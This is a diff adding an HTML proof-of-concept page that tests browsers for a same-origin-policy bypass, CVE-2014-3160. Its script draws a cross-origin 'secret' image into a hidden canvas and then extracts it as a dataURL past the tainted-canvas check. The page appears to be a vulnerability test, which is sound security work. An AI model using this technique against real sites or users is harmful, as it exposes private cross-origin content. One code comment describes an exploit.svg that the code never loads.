@@ -1,0 +1,112 @@
+
+<html>
+	<head>
+		<title>Universal XSS (UXSS) SOP Bypass Vulnerability test CVE 2014-3160</title>
+		<style type="text/css">
+			*{margin:0;padding:0;}
+			.wrapper {
+				width: 95%;
+				background-color: #16a085;
+				margin: 0 auto;
+				font-family: times new roman;
+				height: 88%;
+			}
+			.line {
+				background-color: #ecf0f1;
+				text-align: center;
+				padding: 10px;
+				color: #16a085;;
+			}
+			.main {
+				color: #fff;
+				padding: 10px;
+			}
+			.test {
+				width: 200px;
+				height: 40px;
+				background-color: #fff;
+				border: none;
+				border-radius: 100px;	
+				color: #16a085;
+				font-size: 1.6em;
+				margin: 0 auto;
+			}
+			.note {
+				background: #1abc9c;
+				color: #fff;
+				padding: 10px;
+				width: 95%;
+				margin: 0 auto;
+				margin-top: 40px;
+			}
+		</style>
+	</head>
+<body>
+
+
+	<div class="wrapper">
+			
+	
+			<h3 class="line">SOP Bypass - Testcase 19 - Login with user/pass test/secret</h3>	
+
+		<div class="main">
+				
+		</div>
+		
+
+
+
+		<center>	<input type="button" id="btn_test" class="test" value="EXploit step 1" onclick="go1()" /></center><br>
+		<center> <input type="button" id="btn_test" class="test" value="EXploit step 2" onclick="go2()" /></center> 
+		</br>
+
+<!-- Populates the image cache with the "secret" cross-origin image -->
+<object data="http://0xbeef.de/secret/secret.jpg" type="image/svg+xml"></object>
+
+<!-- Canvas (hidden) to strip the cross-origin image into dataURL later (can also be hidden using style="display:none" !) -->
+<canvas id="canvas" width="700" height="500"/>
+
+		
+
+<script>
+  function importSVG(source, target) {
+  	var ctx = target.getContext("2d");
+  	var img = new Image();
+  	img.src = source;
+  	img.onload = function() {
+  		ctx.drawImage(img,0,0);
+  	}
+  }
+
+
+  // load the attacker's exploit.svg into the Canvas (note the exploit.svg itself references the victim's secret cross-origin image!)
+  function go1() {
+    var canvas = document.getElementById("canvas");
+    importSVG("http://0xbeef.de/secret/secret.jpg", canvas);
+  }
+
+  // exfiltrates the cross-origin image by stripping the canvas into dataURL without triggering the *tainted canvas* security exception: 
+  function go2() {
+    var img = canvas.toDataURL("image/png");
+    document.write("Exploit triggered... Rendering exfiltrated image here: <p/><img border='1' src='"+img+"'/><hr/>To proof, just use this dataURL as image source:<p/><textarea rows='20' cols='80'>"+img+"</textarea>");
+  }  
+  
+</script>
+
+</canvas>
+
+ 
+ 
+
+		</br></br>
+			<div class="note">
+		
+				<p><strong>Note:</strong> <br />
+					If exploit Step 2 displays a new page with the secret image, your browser is vulnerable to SOP bypass.
+				</p>
+			</div>
+	</div>
+
+
+</body>
+</html>
